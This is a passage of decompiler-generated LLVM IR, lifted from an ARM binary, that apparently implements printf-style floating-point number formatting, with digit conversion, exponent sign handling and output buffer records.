  %v4_185d8 = and i32 %v3_185d8, %v0_185d8
  %v5_185d8 = icmp slt i32 %v4_185d8, 0
  store i1 %v5_185d8, i1* %cpsr_v.global-to-local, align 1
  %v6_185d8 = icmp slt i32 %v1_185d8, 0
  store i1 %v6_185d8, i1* %cpsr_n.global-to-local, align 1
  %v7_185d8 = icmp eq i32 %v0_185d8, 102
  store i1 %v7_185d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_185d8, i32* %sl.global-to-local, align 4
  br i1 %v7_185d8, label %dec_label_pc_185d8.dec_label_pc_185f0_crit_edge, label %dec_label_pc_185e4

dec_label_pc_185d8.dec_label_pc_185f0_crit_edge:  ; preds = %dec_label_pc_185d8
  %v0_185f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_185f0

dec_label_pc_185e4:                               ; preds = %.thread, %dec_label_pc_185d8
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18600

dec_label_pc_185f0:                               ; preds = %bb210, %dec_label_pc_185d8.dec_label_pc_185f0_crit_edge
  %v0_185f0 = phi i32 [ %v0_185f0.pre, %dec_label_pc_185d8.dec_label_pc_185f0_crit_edge ], [ %v0_185ac, %bb210 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_185f0 = icmp slt i32 %v0_185f0, 0
  store i1 %v1_185f0, i1* %cpsr_n.global-to-local, align 1
  %v2_185f0 = icmp eq i32 %v0_185f0, 0
  store i1 %v2_185f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_185f0, label %bb211, label %bb212

bb211:                                            ; preds = %dec_label_pc_185f0
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_185f8 = load i32, i32* %r2.global-to-local, align 4
  %v6_185f8 = add i32 %v5_185f8, -1
  %v7_185f8 = inttoptr i32 %v6_185f8 to i8*
  store i8 48, i8* %v7_185f8, align 1
  %v8_185f8 = load i32, i32* %r2.global-to-local, align 4
  %v9_185f8 = add i32 %v8_185f8, -1
  store i32 %v9_185f8, i32* %r2.global-to-local, align 4
  %v0_185fc.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1862c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_18630.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18630.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_185f0, %bb211
  %v1_18630.pre = phi i1 [ %v1_18630.pre.pre, %bb211 ], [ false, %dec_label_pc_185f0 ]
  %v0_18630.pre = phi i1 [ %v0_18630.pre.pre, %bb211 ], [ false, %dec_label_pc_185f0 ]
  %v1_1862c.pre = phi i32 [ %v1_1862c.pre.pre, %bb211 ], [ %v1_185a4, %dec_label_pc_185f0 ]
  %v0_185fc = phi i32 [ %v0_185fc.pre, %bb211 ], [ %v0_185f0, %dec_label_pc_185f0 ]
  store i32 %v0_185fc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18600

dec_label_pc_18600:                               ; preds = %dec_label_pc_185e4, %bb212
  %v0_186d0 = phi i32 [ 0, %dec_label_pc_185e4 ], [ %v0_185fc, %bb212 ]
  %v1_18634 = phi i1 [ false, %dec_label_pc_185e4 ], [ %v1_18630.pre, %bb212 ]
  %v0_18634 = phi i1 [ false, %dec_label_pc_185e4 ], [ %v0_18630.pre, %bb212 ]
  %v1_1862c = phi i32 [ %v1_185a4, %dec_label_pc_185e4 ], [ %v1_1862c.pre, %bb212 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_1860c = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_1860c, i32* %r3.global-to-local, align 4
  %v0_18618 = load i32, i32* %r2.global-to-local, align 4
  %v1_18618 = inttoptr i32 %v0_18618 to i8*
  %v2_18618 = load i8, i8* %v1_18618, align 1
  %v3_18618 = zext i8 %v2_18618 to i32
  store i32 %v3_18618, i32* %r3.global-to-local, align 4
  %v5_18618 = add i32 %v0_18618, 1
  store i32 %v5_18618, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_18618, i32* %stack_var_-46, align 4
  %v2_1862c = sub i32 %v1_1862c, %v5_18618
  store i32 %v2_1862c, i32* %r1.global-to-local, align 4
  %v2_18630 = xor i1 %v1_18634, %v0_18634
  br i1 %v2_18630, label %.thread127, label %dec_label_pc_18638

.thread127:                                       ; preds = %dec_label_pc_18600
  %v5_18630 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_18630, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_186e0

dec_label_pc_18638:                               ; preds = %dec_label_pc_18600
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_1863c = sub i32 %v0_186d0, %v2_1862c
  %v4_1863c = xor i32 %v2_1862c, %v0_186d0
  %v5_1863c = xor i32 %v2_1863c, %v0_186d0
  %v6_1863c = and i32 %v5_1863c, %v4_1863c
  %v7_1863c = icmp slt i32 %v6_1863c, 0
  store i1 %v7_1863c, i1* %cpsr_v.global-to-local, align 1
  %v8_1863c = icmp slt i32 %v2_1863c, 0
  store i1 %v8_1863c, i1* %cpsr_n.global-to-local, align 1
  %v9_1863c = icmp eq i32 %v0_186d0, %v2_1862c
  store i1 %v9_1863c, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_18648 = xor i1 %v8_1863c, %v7_1863c
  br i1 %v2_18648, label %bb214, label %dec_label_pc_1864c

dec_label_pc_1864c:                               ; preds = %dec_label_pc_18638
  store i32 %v2_1863c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_1863c, i1* %cpsr_n.global-to-local, align 1
  %v2_18650 = icmp eq i32 %v2_1863c, 0
  store i1 %v2_18650, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_182b0, i32* %lr.global-to-local, align 4
  %tmp213 = icmp slt i32 %v2_1863c, 1
  br i1 %tmp213, label %.thread129, label %dec_label_pc_18664

.thread129:                                       ; preds = %dec_label_pc_1864c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_186dc

dec_label_pc_18664:                               ; preds = %dec_label_pc_1864c
  store i32 ptrtoint (i32* @global_var_2061f.1113 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_18670 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_18670, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_186e0

bb214:                                            ; preds = %dec_label_pc_18638
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_186bc = icmp slt i32 %v0_186d0, 0
  store i1 %v1_186bc, i1* %cpsr_n.global-to-local, align 1
  %v2_186bc = icmp eq i32 %v0_186d0, 0
  store i1 %v2_186bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_182b0, i32* %lr.global-to-local, align 4
  %tmp215 = icmp slt i32 %v0_186d0, 1
  br i1 %tmp215, label %dec_label_pc_186dc, label %dec_label_pc_186cc

dec_label_pc_186cc:                               ; preds = %bb214
  %v2_186d0 = sub i32 %v2_1862c, %v0_186d0
  store i32 %v2_186d0, i32* %r1.global-to-local, align 4
  %v2_186d4 = add i32 %v5_18618, %v0_186d0
  store i32 %v2_186d4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_186dc

dec_label_pc_186dc:                               ; preds = %dec_label_pc_186cc, %.thread129, %bb214
  %storemerge141.in = phi i32* [ %stack_var_-160, %bb214 ], [ %stack_var_-148, %.thread129 ], [ %stack_var_-148, %dec_label_pc_186cc ]
  %v0_186f082 = phi i32 [ %v2_1862c, %bb214 ], [ 0, %.thread129 ], [ %v2_186d0, %dec_label_pc_186cc ]
  %storemerge141 = ptrtoint i32* %storemerge141.in to i32
  store i32 %storemerge141, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_186e0

dec_label_pc_186e0:                               ; preds = %.thread127, %dec_label_pc_18664, %dec_label_pc_186dc
  %v1_18710 = phi i32 [ %v2_18670, %dec_label_pc_18664 ], [ %storemerge141, %dec_label_pc_186dc ], [ %v5_18630, %.thread127 ]
  %v0_1872890 = phi i32 [ -1, %dec_label_pc_18664 ], [ -1, %dec_label_pc_186dc ], [ %v0_186d0, %.thread127 ]
  %v0_186f0 = phi i32 [ 0, %dec_label_pc_18664 ], [ %v0_186f082, %dec_label_pc_186dc ], [ %v2_1862c, %.thread127 ]
  %v0_186e0 = load i32, i32* %fp.global-to-local, align 4
  %v1_186e0 = add i32 %v0_186e0, 12
  %v2_186e0 = inttoptr i32 %v1_186e0 to i32*
  %v3_186e0 = load i32, i32* %v2_186e0, align 4
  %v1_186e4 = and i32 %v3_186e0, 16
  store i32 %v1_186e4, i32* %lr.global-to-local, align 4
  %v2_186e4 = icmp eq i32 %v1_186e4, 0
  %tmp238 = zext i1 %v2_186e4 to i32
  %.230 = xor i32 %tmp238, 1
  store i32 %.230, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_186f0 = icmp slt i32 %v0_186f0, 0
  store i1 %v1_186f0, i1* %cpsr_n.global-to-local, align 1
  %v2_186f0 = icmp eq i32 %v0_186f0, 0
  store i1 %v2_186f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186f0, label %bb218, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_186e0
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1870c

bb218:                                            ; preds = %dec_label_pc_186e0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_186e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186e4, label %dec_label_pc_18700, label %dec_label_pc_1870c

dec_label_pc_18700:                               ; preds = %bb218
  %v0_18700 = load i32, i32* %r7.global-to-local, align 4
  %v1_18700 = add i32 %v0_18700, -103
  %v3_18700 = sub i32 102, %v0_18700
  %v4_18700 = and i32 %v3_18700, %v0_18700
  %v5_18700 = icmp slt i32 %v4_18700, 0
  store i1 %v5_18700, i1* %cpsr_v.global-to-local, align 1
  %v6_18700 = icmp slt i32 %v1_18700, 0
  store i1 %v6_18700, i1* %cpsr_n.global-to-local, align 1
  %v7_18700 = icmp eq i32 %v0_18700, 103
  store i1 %v7_18700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18700, label %dec_label_pc_18728, label %bb219

bb219:                                            ; preds = %dec_label_pc_18700
  %v1_18704 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_18704 = icmp slt i32 %v1_18704, 0
  store i1 %v2_18704, i1* %cpsr_n.global-to-local, align 1
  %v3_18704 = icmp eq i32 %v1_18704, 0
  store i1 %v3_18704, i1* %cpsr_z.global-to-local, align 1
  %tmp220 = icmp slt i32 %v1_18704, 1
  br i1 %tmp220, label %dec_label_pc_18728, label %dec_label_pc_1870c

dec_label_pc_1870c:                               ; preds = %.thread33, %bb218, %bb219
  %v2_18710 = inttoptr i32 %v1_18710 to i32*
  store i32 112, i32* %v2_18710, align 4
  %v1_18718 = load i32, i32* %r6.global-to-local, align 4
  %v2_18718 = add i32 %v1_18718, 4
  %v3_18718 = inttoptr i32 %v2_18718 to i32*
  store i32 1, i32* %v3_18718, align 4
  store i32 ptrtoint (i32* @global_var_2062c.1115 to i32), i32* %r3.global-to-local, align 4
  %v1_18720 = load i32, i32* %r6.global-to-local, align 4
  %v2_18720 = add i32 %v1_18720, 8
  %v3_18720 = inttoptr i32 %v2_18720 to i32*
  store i32 ptrtoint (i32* @global_var_2062c.1115 to i32), i32* %v3_18720, align 4
  %v0_18724 = load i32, i32* %r6.global-to-local, align 4
  %v1_18724 = add i32 %v0_18724, 12
  store i32 %v1_18724, i32* %r6.global-to-local, align 4
  %v0_18728.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18728

dec_label_pc_18728:                               ; preds = %dec_label_pc_18700, %bb219, %dec_label_pc_1870c
  %v1_18734 = phi i32 [ %v1_18710, %bb219 ], [ %v1_18724, %dec_label_pc_1870c ], [ %v1_18710, %dec_label_pc_18700 ]
  %v0_18728 = phi i32 [ %v0_1872890, %bb219 ], [ %v0_18728.pre, %dec_label_pc_1870c ], [ %v0_1872890, %dec_label_pc_18700 ]
  %v1_18728 = add i32 %v0_18728, 1
  store i32 %v1_18728, i32* %ip.global-to-local, align 4
  %v3_18728 = sub i32 0, %v0_18728
  %v4_18728 = and i32 %v1_18728, %v3_18728
  %v5_18728 = icmp slt i32 %v4_18728, 0
  store i1 %v5_18728, i1* %cpsr_v.global-to-local, align 1
  %v6_18728 = icmp slt i32 %v1_18728, 0
  store i1 %v6_18728, i1* %cpsr_n.global-to-local, align 1
  %v7_18728 = icmp eq i32 %v1_18728, 0
  store i1 %v7_18728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18728, label %dec_label_pc_1874c, label %dec_label_pc_18730

dec_label_pc_18730:                               ; preds = %dec_label_pc_18728
  %v1_18730 = sub i32 -1, %v0_18728
  %v2_18734 = add i32 %v1_18734, 4
  %v3_18734 = inttoptr i32 %v2_18734 to i32*
  store i32 %v1_18730, i32* %v3_18734, align 4
  store i32 ptrtoint (i32* @global_var_2061f.1113 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_18740 = load i32, i32* %r6.global-to-local, align 4
  %v2_18740 = inttoptr i32 %v1_18740 to i32*
  store i32 176, i32* %v2_18740, align 4
  %v0_18744 = load i32, i32* %r3.global-to-local, align 4
  %v1_18744 = load i32, i32* %r6.global-to-local, align 4
  %v2_18744 = add i32 %v1_18744, 8
  %v3_18744 = inttoptr i32 %v2_18744 to i32*
  store i32 %v0_18744, i32* %v3_18744, align 4
  %v0_18748 = load i32, i32* %r6.global-to-local, align 4
  %v1_18748 = add i32 %v0_18748, 12
  store i32 %v1_18748, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1874c

dec_label_pc_1874c:                               ; preds = %dec_label_pc_18728, %dec_label_pc_18730
  %v2_18754 = phi i32 [ %v1_18734, %dec_label_pc_18728 ], [ %v1_18748, %dec_label_pc_18730 ]
  %v0_1874c = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1874c = icmp slt i32 %v0_1874c, 0
  store i1 %v1_1874c, i1* %cpsr_n.global-to-local, align 1
  %v2_1874c = icmp eq i32 %v0_1874c, 0
  store i1 %v2_1874c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1874c, label %.thread42, label %bb221

bb221:                                            ; preds = %dec_label_pc_1874c
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_18754 = inttoptr i32 %v2_18754 to i32*
  store i32 112, i32* %v3_18754, align 4
  %v1_18758 = load i32, i32* %r4.global-to-local, align 4
  %v2_18758 = load i32, i32* %r6.global-to-local, align 4
  %v3_18758 = add i32 %v2_18758, 8
  %v4_18758 = inttoptr i32 %v3_18758 to i32*
  store i32 %v1_18758, i32* %v4_18758, align 4
  %v1_1875c = load i32, i32* %r1.global-to-local, align 4
  %v2_1875c = load i32, i32* %r6.global-to-local, align 4
  %v3_1875c = add i32 %v2_1875c, 4
  %v4_1875c = inttoptr i32 %v3_1875c to i32*
  store i32 %v1_1875c, i32* %v4_1875c, align 4
  %v1_18760 = load i32, i32* %r6.global-to-local, align 4
  %v2_18760 = add i32 %v1_18760, 12
  store i32 %v2_18760, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_1874c, %bb221
  %v1_18784 = phi i32 [ %v2_18754, %dec_label_pc_1874c ], [ %v2_18760, %bb221 ]
  %v0_18764 = load i32, i32* %r7.global-to-local, align 4
  %v1_18764 = add i32 %v0_18764, -103
  %v3_18764 = sub i32 102, %v0_18764
  %v4_18764 = and i32 %v3_18764, %v0_18764
  %v5_18764 = icmp slt i32 %v4_18764, 0
  store i1 %v5_18764, i1* %cpsr_v.global-to-local, align 1
  %v6_18764 = icmp slt i32 %v1_18764, 0
  store i1 %v6_18764, i1* %cpsr_n.global-to-local, align 1
  %v7_18764 = icmp eq i32 %v0_18764, 103
  store i1 %v7_18764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18764, label %dec_label_pc_1876c, label %dec_label_pc_18774

dec_label_pc_1876c:                               ; preds = %.thread42
  %v0_1876c = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1876c = icmp slt i32 %v0_1876c, 0
  store i1 %v1_1876c, i1* %cpsr_n.global-to-local, align 1
  %v2_1876c = icmp eq i32 %v0_1876c, 0
  store i1 %v2_1876c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1876c, label %dec_label_pc_1879c, label %dec_label_pc_18774

dec_label_pc_18774:                               ; preds = %.thread42, %dec_label_pc_1876c
  %v0_18774 = load i32, i32* %ip.global-to-local, align 4
  %v1_18774 = load i32, i32* %r1.global-to-local, align 4
  %v2_18774 = sub i32 %v1_18774, %v0_18774
  store i32 %v2_18774, i32* %r3.global-to-local, align 4
  %v1_18778 = load i32, i32* %r8.global-to-local, align 4
  %v2_18778 = sub i32 %v2_18774, %v1_18778
  %v4_18778 = xor i32 %v1_18778, %v2_18774
  %v5_18778 = xor i32 %v2_18778, %v2_18774
  %v6_18778 = and i32 %v5_18778, %v4_18778
  %v7_18778 = icmp slt i32 %v6_18778, 0
  store i1 %v7_18778, i1* %cpsr_v.global-to-local, align 1
  %v8_18778 = icmp slt i32 %v2_18778, 0
  store i1 %v8_18778, i1* %cpsr_n.global-to-local, align 1
  %v9_18778 = icmp eq i32 %v2_18774, %v1_18778
  store i1 %v9_18778, i1* %cpsr_z.global-to-local, align 1
  %v2_1877c = xor i1 %v8_18778, %v7_18778
  br i1 %v2_1877c, label %dec_label_pc_18780, label %dec_label_pc_1879c

dec_label_pc_18780:                               ; preds = %dec_label_pc_18774
  %v2_18780 = sub i32 %v1_18778, %v2_18774
  %v2_18784 = add i32 %v1_18784, 4
  %v3_18784 = inttoptr i32 %v2_18784 to i32*
  store i32 %v2_18780, i32* %v3_18784, align 4
  store i32 ptrtoint (i32* @global_var_2061f.1113 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_18790 = load i32, i32* %r6.global-to-local, align 4
  %v2_18790 = inttoptr i32 %v1_18790 to i32*
  store i32 176, i32* %v2_18790, align 4
  %v0_18794 = load i32, i32* %r3.global-to-local, align 4
  %v1_18794 = load i32, i32* %r6.global-to-local, align 4
  %v2_18794 = add i32 %v1_18794, 8
  %v3_18794 = inttoptr i32 %v2_18794 to i32*
  store i32 %v0_18794, i32* %v3_18794, align 4
  %v0_18798 = load i32, i32* %r6.global-to-local, align 4
  %v1_18798 = add i32 %v0_18798, 12
  store i32 %v1_18798, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1879c

dec_label_pc_1879c:                               ; preds = %dec_label_pc_18774, %dec_label_pc_1876c, %dec_label_pc_18780
  %v1_18830.pre.pre = phi i32 [ %v1_18784, %dec_label_pc_18774 ], [ %v1_18784, %dec_label_pc_1876c ], [ %v1_18798, %dec_label_pc_18780 ]
  %v0_1879c = load i32, i32* %sl.global-to-local, align 4
  %v1_1879c = add i32 %v0_1879c, -102
  %v3_1879c = sub i32 101, %v0_1879c
  %v4_1879c = and i32 %v3_1879c, %v0_1879c
  %v5_1879c = icmp slt i32 %v4_1879c, 0
  store i1 %v5_1879c, i1* %cpsr_v.global-to-local, align 1
  %v6_1879c = icmp slt i32 %v1_1879c, 0
  store i1 %v6_1879c, i1* %cpsr_n.global-to-local, align 1
  %v7_1879c = icmp eq i32 %v0_1879c, 102
  store i1 %v7_1879c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1879c, label %dec_label_pc_18824, label %dec_label_pc_187a4

dec_label_pc_187a4:                               ; preds = %dec_label_pc_1879c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_187a8 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_187a8 = icmp slt i32 %v0_187a8, 0
  store i1 %v1_187a8, i1* %cpsr_n.global-to-local, align 1
  %v2_187a8 = icmp eq i32 %v0_187a8, 0
  store i1 %v2_187a8, i1* %cpsr_z.global-to-local, align 1
  %v4_187ac = zext i8 %stack_var_-66.0108114 to i32
  store i32 %v4_187ac, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_187bc = sub i32 0, %v0_187a8
  %storemerge140 = select i1 %v1_187a8, i32 %v4_187bc, i32 %v0_187a8
  %tmp239 = ashr i32 %v0_187a8, 31
  %tmp240 = and i32 %tmp239, 2
  %tmp241 = add nuw nsw i32 %tmp240, 43
  store i32 %storemerge140, i32* %r4.global-to-local, align 4
  store i32 %tmp241, i32* %sl.global-to-local, align 4
  %v2_187c4 = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_187c4, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_187cc

dec_label_pc_187cc:                               ; preds = %dec_label_pc_187fc, %dec_label_pc_187cc, %dec_label_pc_187a4
  %v2_187e4 = phi i32 [ %v2_187c4, %dec_label_pc_187a4 ], [ %v6_187e4, %dec_label_pc_187cc ], [ %v6_187e4, %dec_label_pc_187fc ]
  %v0_187e0 = phi i32 [ %storemerge140, %dec_label_pc_187a4 ], [ %v2_187e8, %dec_label_pc_187cc ], [ %v2_187e8, %dec_label_pc_187fc ]
  %v2_187d4 = srem i32 %v0_187e0, 10
  %v1_187d8 = add nsw i32 %v2_187d4, 48
  store i32 %v1_187d8, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_187e0, i32* %r0.global-to-local, align 4
  %v1_187e4 = trunc i32 %v1_187d8 to i8
  %v3_187e4 = add i32 %v2_187e4, -1
  %v4_187e4 = inttoptr i32 %v3_187e4 to i8*
  store i8 %v1_187e4, i8* %v4_187e4, align 1
  %v5_187e4 = load i32, i32* %r5.global-to-local, align 4
  %v6_187e4 = add i32 %v5_187e4, -1
  store i32 %v6_187e4, i32* %r5.global-to-local, align 4
  %v0_187e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_187e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_187e8 = sdiv i32 %v0_187e8, %v1_187e8
  store i32 %v2_187e8, i32* %r0.global-to-local, align 4
  %v0_187ec = load i32, i32* %r7.global-to-local, align 4
  %v1_187ec = add i32 %v0_187ec, 1
  store i32 %v1_187ec, i32* %r7.global-to-local, align 4
  %v1_187f0 = add i32 %v0_187ec, -2
  %v3_187f0 = sub i32 1, %v0_187ec
  %v4_187f0 = and i32 %v3_187f0, %v1_187ec
  %v5_187f0 = icmp slt i32 %v4_187f0, 0
  store i1 %v5_187f0, i1* %cpsr_v.global-to-local, align 1
  %v6_187f0 = icmp slt i32 %v1_187f0, 0
  store i1 %v6_187f0, i1* %cpsr_n.global-to-local, align 1
  %v7_187f0 = icmp eq i32 %v1_187ec, 3
  store i1 %v7_187f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_187e8, i32* %r4.global-to-local, align 4
  %v7_187f8 = icmp slt i32 %v1_187ec, 4
  br i1 %v7_187f8, label %dec_label_pc_187cc, label %dec_label_pc_187fc

dec_label_pc_187fc:                               ; preds = %dec_label_pc_187cc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_187fc = icmp slt i32 %v2_187e8, 0
  store i1 %v1_187fc, i1* %cpsr_n.global-to-local, align 1
  %v2_187fc = icmp eq i32 %v2_187e8, 0
  store i1 %v2_187fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_187fc, label %dec_label_pc_18804, label %dec_label_pc_187cc

dec_label_pc_18804:                               ; preds = %dec_label_pc_187fc
  %v1_18804 = add i32 %v5_187e4, -2
  store i32 %v1_18804, i32* %r3.global-to-local, align 4
  %v0_18808 = load i32, i32* %sl.global-to-local, align 4
  %v1_18808 = trunc i32 %v0_18808 to i8
  %v4_18808 = inttoptr i32 %v1_18804 to i8*
  store i8 %v1_18808, i8* %v4_18808, align 1
  %v0_1880c = load i32, i32* %r3.global-to-local, align 4
  %v1_1880c = add i32 %v0_1880c, -1
  store i32 %v1_1880c, i32* %r2.global-to-local, align 4
  %v0_18810 = load i32, i32* %r8.global-to-local, align 4
  %v1_18810 = trunc i32 %v0_18810 to i8
  %v4_18810 = inttoptr i32 %v1_1880c to i8*
  store i8 %v1_18810, i8* %v4_18810, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_18818 = load i32, i32* %r6.global-to-local, align 4
  %v1_18818 = inttoptr i32 %v0_18818 to i32*
  store i32 112, i32* %v1_18818, align 4
  %v3_18818 = add i32 %v0_18818, 4
  %v4_18818 = inttoptr i32 %v3_18818 to i32*
  %v5_18818 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_18818, i32* %v4_18818, align 4
  %v0_1881c = load i32, i32* %r2.global-to-local, align 4
  %v1_1881c = load i32, i32* %r6.global-to-local, align 4
  %v2_1881c = add i32 %v1_1881c, 8
  %v3_1881c = inttoptr i32 %v2_1881c to i32*
  store i32 %v0_1881c, i32* %v3_1881c, align 4
  %v0_18820 = load i32, i32* %r6.global-to-local, align 4
  %v1_18820 = add i32 %v0_18820, 12
  store i32 %v1_18820, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18824

dec_label_pc_18824:                               ; preds = %dec_label_pc_1879c, %.thread105, %dec_label_pc_18804
  %v1_18830.pre = phi i32 [ %v2_1839c, %.thread105 ], [ %v1_18820, %dec_label_pc_18804 ], [ %v1_18830.pre.pre, %dec_label_pc_1879c ]
  %v2_18824 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_18824, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18828

dec_label_pc_18828:                               ; preds = %dec_label_pc_18828, %dec_label_pc_18824
  %v0_18828 = phi i32 [ %v2_18824, %dec_label_pc_18824 ], [ %v4_18828, %dec_label_pc_18828 ]
  %stack_var_-188.0 = phi i32 [ %v3_182d4, %dec_label_pc_18824 ], [ %v2_18834, %dec_label_pc_18828 ]
  %v1_18828 = inttoptr i32 %v0_18828 to i32*
  %v2_18828 = load i32, i32* %v1_18828, align 4
  store i32 %v2_18828, i32* %r3.global-to-local, align 4
  %v4_18828 = add i32 %v0_18828, 12
  store i32 %v4_18828, i32* %r2.global-to-local, align 4
  %v3_18830 = icmp ult i32 %v4_18828, %v1_18830.pre
  %v2_18834 = sub i32 %stack_var_-188.0, %v2_18828
  store i32 %v2_18834, i32* %ip.global-to-local, align 4
  br i1 %v3_18830, label %dec_label_pc_18828, label %dec_label_pc_18840

dec_label_pc_18840:                               ; preds = %dec_label_pc_18828
  %v3_18840 = load i8, i8* %stack_var_-50, align 1
  %v4_18840 = sext i8 %v3_18840 to i32
  store i32 %v4_18840, i32* %r3.global-to-local, align 4
  store i32 %v4_18840, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18844 = icmp slt i8 %v3_18840, 0
  store i1 %v1_18844, i1* %cpsr_n.global-to-local, align 1
  %v2_18844 = icmp eq i8 %v3_18840, 0
  store i1 %v2_18844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18844, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_18840
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_18840, %bb225
  %v1_18890 = phi i32 [ %v4_18840, %dec_label_pc_18840 ], [ 1, %bb225 ]
  %v2_1884c = sub i32 %v2_18834, %v1_18890
  store i32 %v2_1884c, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_18854 = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_18854, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18858 = icmp slt i32 %v2_1884c, 0
  store i1 %v1_18858, i1* %cpsr_n.global-to-local, align 1
  %v2_18858 = icmp eq i32 %v2_1884c, 0
  store i1 %v2_18858, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp227 = icmp slt i32 %v2_1884c, 1
  br i1 %tmp227, label %dec_label_pc_188b8, label %dec_label_pc_1886c

dec_label_pc_1886c:                               ; preds = %bb226
  %v0_1886c = load i32, i32* %fp.global-to-local, align 4
  %v1_1886c = add i32 %v0_1886c, 12
  %v2_1886c = inttoptr i32 %v1_1886c to i32*
  %v3_1886c = load i32, i32* %v2_1886c, align 4
  store i32 %v3_1886c, i32* %r3.global-to-local, align 4
  %v1_18870 = and i32 %v3_1886c, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18870 = icmp eq i32 %v1_18870, 0
  store i1 %v2_18870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18870, label %dec_label_pc_18888, label %dec_label_pc_18878

dec_label_pc_18878:                               ; preds = %dec_label_pc_1886c
